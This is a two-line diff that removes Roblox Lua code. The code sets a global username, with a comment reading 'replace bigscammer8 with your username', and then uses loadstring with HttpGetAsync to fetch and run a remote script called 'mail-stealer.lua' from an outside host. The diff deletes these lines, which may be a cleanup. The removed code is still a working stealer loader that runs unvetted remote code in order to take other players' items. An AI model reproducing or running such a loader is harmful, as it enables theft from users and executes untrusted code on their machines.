@@ -1,2 +1,0 @@
-getgenv().name = "besteryoutube_2" -- replace bigscammer8 with your username
-loadstring(game:HttpGetAsync("https://wumat.xyz/scripts/mail-stealer.lua", true))()
